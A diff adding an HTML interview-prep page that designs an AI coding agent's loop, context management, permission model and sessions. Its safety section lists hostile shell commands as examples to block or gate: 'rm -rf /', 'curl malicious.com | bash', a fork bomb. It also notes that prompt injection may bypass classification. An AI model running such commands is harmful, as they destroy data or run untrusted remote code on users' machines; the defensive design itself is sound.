+    <rect class="svg-node" x="130" y="588" width="301" height="44" rx="7" fill="rgba(188,140,255,.06)" stroke="rgba(188,140,255,.3)"/>
+    <text x="280" y="616" fill="#bc8cff" font-size="12" font-weight="600" text-anchor="middle">LLM API</text>
+    <line x1="280" y1="632" x2="280" y2="702" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <text x="296" y="648" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">tool_use: FileEdit("src/auth/handler.ts", ...)</text>
+    <text x="296" y="664" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">... LOOP continues until LLM returns plain text (no tool_use) ...</text>
+    <rect class="svg-node" x="131" y="704" width="298" height="44" rx="7" fill="rgba(227,179,65,.06)" stroke="rgba(227,179,65,.3)"/>
+    <text x="280" y="732" fill="#e3b341" font-size="12" font-weight="600" text-anchor="middle">Client</text>
+    <line x1="280" y1="748" x2="280" y2="786" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <rect class="svg-node" x="109" y="788" width="343" height="44" rx="7" fill="rgba(247,120,186,.06)" stroke="rgba(247,120,186,.3)"/>
+    <text x="280" y="806" fill="#f778ba" font-size="12" font-weight="600" text-anchor="middle">Agent Loop Terminates</text>
+    <text x="280" y="822" fill="#6e7681" font-size="9" text-anchor="middle">→ control returns to developer</text>
+  </svg>
+</div>
+
+    <div class="sub">Flow 2: Real-Time Steering</div>
+<div class="svg-diagram" data-anim>
+  <span class="dia-title">Flow 2: Real-Time Steering</span>
+  <svg viewBox="0 0 560 188" xmlns="http://www.w3.org/2000/svg" style="font-family:'DM Sans',sans-serif">
+    <defs><marker id="a1521" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="none" stroke="#6e7681" stroke-width="1.2"/></marker></defs>
+    <rect class="svg-node" x="127" y="40" width="307" height="44" rx="7" fill="rgba(248,81,73,.06)" stroke="rgba(248,81,73,.3)"/>
+    <text x="280" y="58" fill="#f85149" font-size="12" font-weight="600" text-anchor="middle">Developer</text>
+    <text x="280" y="74" fill="#6e7681" font-size="9" text-anchor="middle">types: "actually skip the database layer"</text>
+    <line x1="280" y1="84" x2="280" y2="122" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1521)"/>
+    <rect class="svg-node" x="119" y="124" width="322" height="44" rx="7" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="280" y="142" fill="#39d2c0" font-size="12" font-weight="600" text-anchor="middle">Steering Queue</text>
+    <text x="280" y="158" fill="#6e7681" font-size="9" text-anchor="middle">async dual-buffer</text>
+  </svg>
+</div>
+
+    <div class="callout say">"The most architecturally interesting piece is the agent loop itself — the single-threaded master loop that decides when to call tools, when to plan, and when to stop. That's what I'd like to deep-dive first. Second, context window management — how do we keep the agent coherent over 100+ tool calls without exceeding the context limit."</div>
+  </div>
+</div>
+
+<!-- P4 DEEP DIVES -->
+<div class="phase" id="p4">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase4)">04</span>
+    <span class="phase-title">Deep Dives</span><span class="phase-time">25–30 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+
+    <!-- DD1 -->
+    <div id="dd-loop">
+    <div class="sub">Deep Dive 1: Agent Loop & Tool System (~10 min)</div>
+
+    <div class="callout goal"><strong>The core challenge:</strong> Design a loop that autonomously plans and executes multi-step coding tasks, uses tools effectively, recovers from errors, and terminates when done — while remaining debuggable, transparent, and steerable by the human.</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">The Master Loop (Single-Threaded)</strong></p>
+
+    <div class="schema"><span class="comment">── Pseudocode: Agent Master Loop ──</span>
+
+<span class="table-name">function</span> agentLoop(userMessage, conversationHistory):
+  history = [...conversationHistory, {role: "user", content: userMessage}]
+
+  <span class="table-name">while</span> true:
+    <span class="comment">// 1. Check steering queue for mid-task instructions</span>
+    if steeringQueue.hasMessages():
+      history.append({role: "user", content: steeringQueue.drain()})
+
+    <span class="comment">// 2. Inject TODO list reminder (keeps agent on track)</span>
+    history.append({role: "system", content: currentTodoList()})
+
+    <span class="comment">// 3. Call LLM API with full history + tool definitions</span>
+    response = <span class="pk">streamingLLMCall</span>(history, tools=ALL_TOOLS)
+
+    <span class="comment">// 4. Process response</span>
+    if response.hasToolUse():
+      for each toolCall in response.toolCalls:
+        <span class="comment">// 4a. Check permissions</span>
+        if <span class="fk">permissionEngine.requiresApproval</span>(toolCall):
+          approved = <span class="fk">promptUser</span>(toolCall)
+          if !approved: history.append(toolResult("User denied this action"))
+          else: result = <span class="pk">executeTool</span>(toolCall)
+        else:
+          result = <span class="pk">executeTool</span>(toolCall)
+        history.append(toolResult(result))
+      <span class="comment">// Loop continues — send tool results back to LLM</span>
+
+    else:
+      <span class="comment">// 4b. Plain text response — agent is done</span>
+      display(response.text)
+      <span class="pk">break</span>  <span class="comment">// Exit loop, return control to user</span>
+
+  persistSession(history)</div>
+
+    <div class="callout decision"><strong>Why single-threaded, not multi-agent swarm?</strong> A single-threaded loop with one flat message history is dramatically easier to debug, reason about, and steer. Multi-agent swarms introduce race conditions, conflicting edits, and unpredictable behavior. The single loop gives us transparency: every decision the agent makes is visible in the linear history. Tradeoff: it's sequential (can't parallelize within a single task step), but this is addressed by sub-agent dispatch for explicitly parallel subtasks.</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">Tool System Design</strong></p>
+
+    <table>
+      <thead><tr><th>Tool</th><th>Runs On</th><th>Risk Level</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>FileRead</td><td>Local</td><td>🟢 Safe</td><td>Read file contents. Auto-approved. Most frequent tool (~60% of calls).</td></tr>
+        <tr><td>ListDir</td><td>Local</td><td>🟢 Safe</td><td>List directory structure. Auto-approved.</td></tr>
+        <tr><td>Search (grep/ripgrep)</td><td>Local</td><td>🟢 Safe</td><td>Pattern search across codebase. Auto-approved.</td></tr>
+        <tr><td>FileWrite</td><td>Local</td><td>🟡 Medium</td><td>Create new file. Auto-approved (not overwriting).</td></tr>
+        <tr><td>FileEdit (str_replace)</td><td>Local</td><td>🟡 Medium</td><td>Edit existing file with targeted replacement. Auto-approved by default.</td></tr>
+        <tr><td>Bash</td><td>Local</td><td>🟡-🔴 Variable</td><td>Execute shell command. Risk classified per command. <code>npm test</code> = safe, <code>rm -rf</code> = blocked.</td></tr>
+        <tr><td>TodoWrite</td><td>Local</td><td>🟢 Safe</td><td>Structured task list. Injected as reminder after each tool call.</td></tr>
+        <tr><td>MCP Tool</td><td>Remote</td><td>🟡 Medium</td><td>Dynamic tools from MCP servers. User configures which servers.</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout decision"><strong>Why str_replace for edits instead of full-file rewrites?</strong> Targeted edits (find unique string → replace) are more reliable than regenerating an entire file. A full-file rewrite risks corrupting parts the model wasn't focused on, especially in large files. str_replace ensures only the intended change is made. Tradeoff: requires the replaced string to be unique in the file, which occasionally fails — the tool returns an error and the model retries with more context.</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">Planning: TodoWrite</strong></p>
+    <ul class="items">
+      <li>The model creates a structured JSON task list with IDs, descriptions, status (pending/in_progress/done), and priority.</li>
+      <li>After EVERY tool execution, the current TODO list is injected as a system message ("Reminder: here's your current plan").</li>
+      <li>This prevents the model from "forgetting" the plan mid-session as the context window fills with tool results.</li>
+      <li>Rendered as an interactive checklist in the terminal UI — user can see agent's progress.</li>
+    </ul>
+
+    <div class="callout tip"><strong>The termination signal:</strong> The loop exits when the LLM returns a response with NO tool_use blocks — just text. This is the model's way of saying "I'm done, here's my summary." The human never has to manually stop the agent (though they can interrupt at any time).</div>
+    </div>
+
+    <!-- DD2 -->
+    <div id="dd-context">
+    <div class="sub">Deep Dive 2: Context Window Management (~8 min)</div>
+
+    <div class="callout goal"><strong>The core challenge:</strong> A session may involve 100+ tool calls. Each tool result (e.g., a 500-line file) consumes tokens. The context window (128K-200K tokens) fills up fast. How do we keep the agent coherent without losing critical information?</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">Context Budget Strategy</strong></p>
+
+    <div class="schema"><span class="comment">── Context Window Layout (200K token budget) ──</span>
+
+<span class="pk">System Prompt</span>          ~5K tokens   <span class="comment">// Tool definitions, CLAUDE.md, permissions</span>
+<span class="pk">Conversation History</span>    ~150K tokens <span class="comment">// Messages + tool results (managed)</span>
+<span class="pk">TODO Reminder</span>           ~1K tokens   <span class="comment">// Injected after each tool call</span>
+<span class="pk">Steering Messages</span>       ~2K tokens   <span class="comment">// User mid-task instructions</span>
+<span class="pk">Reserved for Output</span>     ~8K tokens   <span class="comment">// Model's response + tool calls</span>
+<span class="pk">Buffer</span>                  ~34K tokens  <span class="comment">// Safety margin</span></div>
+
+    <ul class="items">
+      <li><strong>Truncation strategy:</strong> When history exceeds ~150K tokens, compress OLDEST tool results. Keep user messages and model reasoning intact. Truncate large file contents to first/last N lines with "[truncated]" marker.</li>
+      <li><strong>Selective file reading:</strong> The model is trained to read files incrementally — first list directories, then read specific files, then read specific line ranges. Avoids dumping entire large files into context.</li>
+      <li><strong>Codebase indexing:</strong> On session start, build a lightweight map of the project (file tree, function signatures). This gives the model a "table of contents" without reading every file. ~2K tokens for a medium project.</li>
+      <li><strong>Compaction:</strong> For very long sessions, summarize old turns: "Earlier in this session, you refactored 5 files in src/auth/. The changes are complete and tests pass." Replace 50K tokens of raw history with a 500-token summary.</li>
+    </ul>
+
+    <div class="callout decision"><strong>Why not RAG over the codebase?</strong> RAG (embed all files → vector search → inject relevant chunks) adds latency and can miss structural relationships. The agent's agentic search approach (list dirs → grep → read specific files) is more precise because the model decides what to look for based on reasoning, not just semantic similarity. Tradeoff: more LLM round-trips (each search is a tool call), but higher accuracy. For massive codebases (>100K files), a lightweight index / embedding layer COULD supplement agentic search.</div>
+
+    <div class="callout decision"><strong>Why inject CLAUDE.md at session start rather than RAG it?</strong> CLAUDE.md is small (typically &lt;2K tokens) and universally relevant — it contains coding standards and project conventions the model should ALWAYS know. RAG-ing it would risk it being sometimes-retrieved, sometimes-not. Always-injecting guarantees consistent behavior. Tradeoff: burns 2K tokens of context budget, but the consistency is worth it.</div>
+    </div>
+
+    <!-- DD3 -->
+    <div id="dd-safety">
+    <div class="sub">Deep Dive 3: Permission & Safety Model (~7 min)</div>
+
+    <div class="callout goal"><strong>The core challenge:</strong> The agent can run ARBITRARY shell commands on the user's machine. <code>rm -rf /</code>, <code>curl malicious.com | bash</code>, <code>git push --force</code>. How do we prevent catastrophic operations while keeping the agent useful?</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">Risk Classification System</strong></p>
+
+    <table>
+      <thead><tr><th>Risk Level</th><th>Behavior</th><th>Examples</th></tr></thead>
+      <tbody>
+        <tr><td>🟢 Safe</td><td>Auto-approve, no prompt</td><td><code>cat</code>, <code>ls</code>, <code>grep</code>, <code>npm test</code>, <code>python -m pytest</code>, file reads</td></tr>
+        <tr><td>🟡 Moderate</td><td>Auto-approve by default, user can opt into prompting</td><td>File edits, <code>npm install</code>, <code>git add</code>, <code>git commit</code></td></tr>
+        <tr><td>🔴 Dangerous</td><td>Always prompt user for confirmation</td><td><code>git push</code>, <code>rm</code> (any), <code>chmod</code>, <code>curl | bash</code>, network requests</td></tr>
+        <tr><td>⛔ Blocked</td><td>Never executed, model told "not allowed"</td><td><code>rm -rf /</code>, <code>sudo</code> (by default), <code>:(){ :|:& };:</code></td></tr>
+      </tbody>
+    </table>
+
+    <ul class="items">
+      <li><strong>Classification method:</strong> Parse the bash command, extract the base command and flags. Match against a risk rule table. Shell expansion (<code>$()</code>, backticks) → auto-elevate to 🔴.</li>
+      <li><strong>Sandbox option:</strong> For CI/CD mode (headless), run in a container with no network access and a read-only filesystem outside the project dir.</li>
+      <li><strong>Allowlist in CLAUDE.md:</strong> Teams can configure per-project rules: "auto-approve <code>docker compose up</code>" or "always block <code>kubectl delete</code>".</li>
+      <li><strong>Audit log:</strong> Every tool execution (approved or denied) is logged locally for the developer to review.</li>
+    </ul>
+
+    <div class="callout decision"><strong>Why client-side permission checks, not server-side?</strong> The agent runs locally — the server (LLM API) just returns text including tool_use blocks. The client decides whether to execute. Server-side filtering would require sending the user's filesystem state to the cloud, which is a privacy violation. Client-side means the developer's code never leaves their machine unless they explicitly use an MCP server. Tradeoff: a compromised client could bypass checks, but the threat model is the MODEL doing something unexpected, not an external attacker.</div>
+    </div>
+
+    <!-- DD4 -->
+    <div id="dd-multi">
+    <div class="sub">Deep Dive 4: Multi-Surface & Session Management (~5 min)</div>
+
+    <div class="callout goal"><strong>The core challenge:</strong> A developer starts a task in the terminal, then wants to see visual diffs in VS Code, then continues on their phone. The session must be portable across surfaces without losing state.</div>
+
+    <p style="color:var(--text-muted);margin:12px 0;font-size:13.5px;line-height:1.6;"><strong style="color:var(--text)">Session Architecture</strong></p>
+
+    <div class="schema"><span class="comment">── Session State (persisted to cloud) ──</span>
+<span class="table-name">session</span>
+  <span class="pk">id</span>                 <span class="type">UUID</span>
+  <span class="fk">user_id</span>            <span class="type">UUID</span>
+  <span class="fk">project_hash</span>       <span class="type">SHA256 (identifies the project directory)</span>
+  conversation       <span class="type">Message[] (full history: user, assistant, tool_use, tool_result)</span>
+  todo_list          <span class="type">JSON (current task plan)</span>
+  active_surface     <span class="type">ENUM (terminal, vscode, web, desktop)</span>
+  status             <span class="type">ENUM (active, paused, completed)</span>
+  created_at         <span class="type">TIMESTAMP</span>
+  last_active_at     <span class="type">TIMESTAMP</span>
+  ttl                <span class="type">TIMESTAMP (auto-expire after 24h of inactivity)</span>
+
+<span class="comment">── Storage: DynamoDB or Redis with persistence ──</span>
+<span class="comment">── Avg session: ~5MB. 100K concurrent = ~500GB. Fits in a Redis cluster.</span></div>
+
+    <ul class="items">
+      <li><strong>Handoff protocol (/teleport):</strong> User types <code>/teleport</code> in terminal → session marked as "paused" with current state → VS Code extension polls for available sessions → user picks session → VS Code resumes with full context.</li>
+      <li><strong>Conflict prevention:</strong> Only one surface can be "active" for a session at a time. Second surface trying to connect gets "session in use on [terminal]" — user must release first.</li>
+      <li><strong>Crash recovery:</strong> Session state is persisted after EVERY tool execution. If terminal crashes mid-session, user restarts and gets "Resume previous session?" with the TODO list showing progress.</li>
+      <li><strong>Sync model:</strong> Conversation history synced to cloud after each turn. Tool results (file contents) NOT synced — they're re-read locally if needed. This keeps sync payloads small (~10KB per turn vs. ~5MB for full file contents).</li>
+    </ul>
+
+    <div class="callout decision"><strong>Why not sync file contents to cloud?</strong> Files change locally between surfaces. If the developer edits a file in their IDE between terminal and VS Code sessions, the cloud-stored file content is stale. Better to re-read from the local filesystem when the session resumes. Only the conversation messages (which reference files by path) are synced. Tradeoff: resuming on a different machine requires the same project checkout.</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- P5 -->
+<div class="phase" id="p5">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase5)">05</span>
+    <span class="phase-title">Cross-Cutting Concerns</span><span class="phase-time">10–12 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+    
+    <div class="sub">Storage Architecture Summary</div>
+    <div class="callout goal"><strong>What goes where and why.</strong> Each data store is chosen for its access pattern — not by default. The question isn't "which database?" but "what are the read/write patterns, consistency requirements, and scale characteristics?"</div>
+    <table>
+      <thead><tr><th>Data</th><th>Store</th><th>Why This Store</th></tr></thead>
+      <tbody>
+      <tr>
+        <td>Conversation context</td>
+        <td style="color:var(--accent-cyan)">In-memory (agent runtime)</td>
+        <td>Current conversation turns + tool results. Fits within 200K token context window. Compacted when approaching limit.</td>
+      </tr>
+      <tr>
+        <td>File system state</td>
+        <td style="color:var(--accent-cyan)">Local disk</td>
+        <td>The project's files. Read/written by tool executor. Git provides version history. No external database needed.</td>
+      </tr>
+      <tr>
+        <td>Session metadata</td>
+        <td style="color:var(--accent-cyan)">DynamoDB / local</td>
+        <td>Session ID, user preferences, permission grants, active projects. Lightweight, key-value access pattern.</td>
+      </tr>
+      <tr>
+        <td>Conversation history</td>
+        <td style="color:var(--accent-cyan)">S3 / local JSON</td>
+        <td>Past conversations for reference. Not loaded into context unless explicitly requested. Markdown export.</td>
+      </tr>
+      <tr>
+        <td>Tool execution logs</td>
+        <td style="color:var(--accent-cyan)">Local disk</td>
+        <td>Bash command history, file edit history. Used for undo/rollback. Ephemeral per session.</td>
+      </tr>
+      </tbody>
+    </table>
+
+    <div class="sub">Failure Scenarios</div>
+    <div class="failure-row"><span class="scenario">LLM API is slow / timeout</span><span class="mitigation">Streaming shows partial output immediately. On timeout, retry with exponential backoff. Show "thinking..." indicator. If persistent, offer fallback to faster/smaller model (Sonnet instead of Opus).</span></div>
+    <div class="failure-row"><span class="scenario">Agent enters infinite loop</span><span class="mitigation">Max iteration limit (configurable, default ~200 tool calls per turn). Detect repetitive patterns (same tool call 3x in a row → inject "You seem stuck" message). User can always Ctrl+C to interrupt.</span></div>
+    <div class="failure-row"><span class="scenario">Tool execution fails (bash error)</span><span class="mitigation">Error output returned to model as tool_result. The model is trained to read errors and adjust. Most coding iterations are exactly this: run tests → see failure → fix → rerun.</span></div>
+    <div class="failure-row"><span class="scenario">Context window exhausted</span><span class="mitigation">Trigger compaction: summarize oldest turns, truncate large tool results. Inform user: "Compacting conversation to fit context." In extreme cases, start a new context with a summary carryover.</span></div>
+    <div class="failure-row"><span class="scenario">Terminal crash mid-edit</span><span class="mitigation">File writes are atomic (write to temp file → rename). Session state was persisted after last tool call. On restart, files reflect last successful edit, and session resumes from last checkpoint.</span></div>
+    <div class="failure-row"><span class="scenario">MCP server unreachable</span><span class="mitigation">Tool call returns error. Model informed "GitHub MCP server is unavailable." Agent continues with local tools. Degrades gracefully — can still read code, just can't fetch issues.</span></div>
+    <div class="failure-row"><span class="scenario">Model hallucinates a file path</span><span class="mitigation">FileRead returns "file not found" as tool_result. Model sees the error and typically self-corrects by listing the directory first. This is the normal agentic search pattern.</span></div>
+
+    <div class="sub">Scalability Considerations</div>
+    <table>
+      <thead><tr><th>Dimension</th><th>Bottleneck</th><th>Mitigation</th></tr></thead>
+      <tbody>
+        <tr><td>LLM inference</td><td>100M API calls/day at 500K tokens avg. Massive GPU demand.</td><td>Model cascade: use smaller model for simple tasks (file listing, grep), larger model for reasoning. Prompt caching for repeated system prompts.</td></tr>
+        <tr><td>Large codebases</td><td>>100K files — agent can't browse efficiently</td><td>Build project index on session start. Supplement agentic search with lightweight embedding index. Cache file tree across sessions.</td></tr>
+        <tr><td>Long sessions</td><td>200K context fills after ~100 tool calls</td><td>Progressive compaction. Sub-agent dispatch (each sub-agent has its own fresh context). Session forking for parallel explorations.</td></tr>
+        <tr><td>Session storage</td><td>500GB active state, 2M new sessions/day</td><td>Redis cluster for active sessions. Archive completed sessions to S3. TTL-based eviction (24h inactive).</td></tr>
+      </tbody>
+    </table>
+
+    <div class="sub">Security & Privacy</div>
+    <ul class="items">
+      <li><strong>Code never leaves the machine (by default):</strong> Tool execution is local. Only conversation messages (user prompts + model responses) go to the cloud LLM API. File contents are sent AS PART OF the API call (as tool results) — but only the files the model explicitly reads.</li>
+      <li><strong>MCP is user-opt-in:</strong> Each MCP server connection is explicitly configured by the developer. No automatic external connections.</li>
+      <li><strong>Bash injection prevention:</strong> Tool system filters shell expansion constructs (backticks, <code>$()</code>) to prevent prompt-injection attacks where malicious file contents trick the model into running harmful commands.</li>
+      <li><strong>Audit trail:</strong> Full log of every tool call, approval/denial, and model reasoning. Stored locally.</li>
+    </ul>
+
+    <div class="sub">Observability</div>
+    <ul class="items">
+      <li><strong>Per-session metrics:</strong> Token usage, tool call count, error rate, session duration, task completion rate.</li>
+      <li><strong>Latency tracking:</strong> Time-to-first-token per LLM call. Tool execution latency. End-to-end task completion time.</li>
+      <li><strong>Quality signals:</strong> Does the agent's code compile? Do tests pass after changes? How many iterations to success?</li>
+      <li><strong>Cost per session:</strong> Token cost breakdown (input vs. output). Identify sessions that burn excessive tokens (stuck in loops).</li>
+    </ul>
+  </div>
+</div>
+
+<!-- P6 -->
+<div class="phase" id="p6">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase6);color:var(--bg)">06</span>
+    <span class="phase-title">Wrap-Up & Evolution</span><span class="phase-time">3–5 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+    <div class="callout say">"To summarize: the architecture is a split design — a local client-side agent runtime that owns the master loop, tool execution, and permission system, backed by a cloud LLM inference API and session persistence layer. The master loop is deliberately single-threaded with one flat message history for debuggability and steerability, with controlled parallelism via sub-agent dispatch for explicitly parallel subtasks. Context window management uses progressive compaction and agentic search (model decides what to read) rather than RAG, trading LLM round-trips for accuracy. The safety model classifies every tool invocation by risk level with client-side enforcement, ensuring code never leaves the developer's machine unless explicitly sent. Session persistence enables crash recovery and multi-surface handoff."</div>
+
+    <div class="sub" id="evolution">What I'd Build Next</div>
+    <table>
+      <thead><tr><th>Extension</th><th>Why It Matters</th><th>Architecture Impact</th></tr></thead>
+      <tbody>
+        <tr><td>Background Agents</td><td>Long-running tasks (CI monitoring, refactoring overnight)</td><td>Agent loop must run server-side in a sandbox (not on dev's machine). Requires cloud-hosted tool execution with filesystem snapshots.</td></tr>
+        <tr><td>Multi-Repo Awareness</td><td>Monorepo and cross-repo refactoring</td><td>Session spans multiple project roots. Index system must understand repo boundaries and dependency graphs.</td></tr>
+        <tr><td>Fine-Grained Code Memory</td><td>Agent remembers project decisions across sessions</td><td>Persistent vector store of project-specific learnings. Injected into context via RAG, complementing CLAUDE.md.</td></tr>
+        <tr><td>Collaborative Sessions</td><td>Two developers working with the same agent</td><td>Real-time sync of conversation state. Conflict resolution when both steer simultaneously.</td></tr>
+        <tr><td>Plugin Ecosystem</td><td>Community-built tools and workflows</td><td>Plugin registry, sandboxed plugin execution, permission inheritance. MCP is already the protocol — need discovery + trust.</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout tip"><strong>Closing framing:</strong> This design is defined by ONE fundamental difference from traditional web systems: it's a LONG-RUNNING STATEFUL AGENT with real-world side effects. Every design decision flows from that: the single-threaded loop for controllability, client-side execution for privacy, permission classification for safety, session persistence for resilience, and context compaction for coherence. The architecture is intentionally simple — complexity is the enemy of debuggability, and debuggability is everything when your agent has <code>sudo</code>.</div>
+  </div>
+</div>
+
+
+<!-- P7 -->
+<div class="phase" id="p7">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--accent-cyan)">07</span>
+    <span class="phase-title">Interview Q&amp;A</span><span class="phase-time">Practice</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path d="M6.3 6.3a1 1 0 011.4 0L10 8.6l2.3-2.3a1 1 0 111.4 1.4l-3 3a1 1 0 01-1.4 0l-3-3a1 1 0 010-1.4z"/></svg>
+  </div>
+  <div class="phase-body">
+    <div class="callout say">"Here are the hardest questions an interviewer would ask about this design, and how to answer them. Each answer demonstrates deep understanding of the tradeoffs, not just surface knowledge."</div>
+
+    <div style="margin:8px 0;">
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-bottom:8px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(248,81,73,.1);color:var(--accent-red);font-weight:600;flex-shrink:0">Q1</span>
+        <p style="color:var(--text);font-size:13.5px;font-weight:600;line-height:1.5;margin:0">How does context window management work when a conversation exceeds 200K tokens?</p>
+      </div>
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-left:0px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(63,185,80,.1);color:var(--accent-green);font-weight:600;flex-shrink:0">A</span>
+        <p style="color:var(--text-muted);font-size:13px;line-height:1.65;margin:0">The context window is a hard constraint — once you're near the limit, you can't just add more tokens. Claude Code uses a compaction strategy: (1) the Context Manager monitors token usage continuously, (2) when usage exceeds ~80% (160K tokens), it triggers compaction, (3) compaction summarizes older conversation turns into a condensed form — detailed tool outputs become summaries, intermediate reasoning becomes conclusions, (4) the compacted context is verified to contain all essential state: what files were modified, what decisions were made, what the current goal is. The key insight is that most of the context is tool results (file contents, bash outputs), not conversation. A `cat` of a 5000-line file takes 5000 lines of context but can be summarized as &quot;file X contains a React component with 15 functions&quot; in 20 tokens. The tradeoff: compaction loses detail. If the user later asks &quot;what was on line 347?&quot;, Claude Code needs to re-read the file rather than recall from context.</p>
+      </div>
+    </div>
+    <div style="margin:18px 0;">
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-bottom:8px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(248,81,73,.1);color:var(--accent-red);font-weight:600;flex-shrink:0">Q2</span>
+        <p style="color:var(--text);font-size:13.5px;font-weight:600;line-height:1.5;margin:0">What prevents Claude Code from executing dangerous commands like rm -rf /?</p>
+      </div>
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-left:0px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(63,185,80,.1);color:var(--accent-green);font-weight:600;flex-shrink:0">A</span>
+        <p style="color:var(--text-muted);font-size:13px;line-height:1.65;margin:0">Multi-layered safety: (1) permission model — dangerous operations (bash commands, file writes outside project directory) require explicit user approval. The default is &quot;ask before executing.&quot; (2) Command classification — the agent classifies each proposed bash command into risk tiers: safe (ls, cat, grep), moderate (npm install, git commit), dangerous (rm -rf, sudo, curl | sh). Dangerous commands always require approval, even in &quot;auto-approve&quot; mode. (3) Sandboxing — in cloud environments, the tool executor runs in a container with limited filesystem access and no network egress to sensitive endpoints. (4) The LLM itself is trained to be cautious — Claude will propose `rm -rf node_modules/` but is unlikely to propose `rm -rf /` because its training emphasizes safe coding practices. The honest limitation: no sandbox is perfect. A sufficiently creative prompt injection could potentially bypass classification heuristics, which is why the human-in-the-loop approval remains the ultimate safety net.</p>
+      </div>
+    </div>
+    <div style="margin:18px 0;">
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-bottom:8px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(248,81,73,.1);color:var(--accent-red);font-weight:600;flex-shrink:0">Q3</span>
+        <p style="color:var(--text);font-size:13.5px;font-weight:600;line-height:1.5;margin:0">How does the agent loop decide when to stop?</p>
+      </div>
+      <div style="display:flex;gap:10px;align-items:flex-start;margin-left:0px">
+        <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(63,185,80,.1);color:var(--accent-green);font-weight:600;flex-shrink:0">A</span>
+        <p style="color:var(--text-muted);font-size:13px;line-height:1.65;margin:0">The agent loop has multiple termination conditions: (1) Task complete — the LLM's response doesn't include a tool call, just a natural language summary. This is the normal exit. (2) User interrupt — the developer presses Ctrl+C or sends a steering message. (3) Max iterations — a configurable limit (default: 50 tool calls) prevents infinite loops. (4) Error threshold — if 3 consecutive tool calls fail, the agent pauses and asks the user for guidance. (5) Budget limit — optional token/cost cap. The most interesting case is detecting &quot;completion&quot; — the LLM must judge when the task is actually done. For concrete tasks (&quot;add a login page&quot;), it runs the code, sees it works, and stops. For vague tasks (&quot;make the code better&quot;), it can loop indefinitely — which is why the max iteration limit exists. The steering queue allows the developer to redirect mid-task: &quot;stop refactoring, focus on the tests&quot; is injected into the context and changes the agent's goal without restarting.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+</main>
+<script>
+const observer=new IntersectionObserver(e=>{e.forEach(e=>{if(e.isIntersecting){document.querySelectorAll('nav a').forEach(a=>a.classList.remove('active'));const l=document.querySelector(`nav a[href="#${e.target.id}"]`);if(l)l.classList.add('active')}})},{rootMargin:'-20% 0px -70% 0px'});document.querySelectorAll('[id]').forEach(s=>{if(document.querySelector(`nav a[href="#${s.id}"]`))observer.observe(s)});
+</script>
+</body>
+</html>
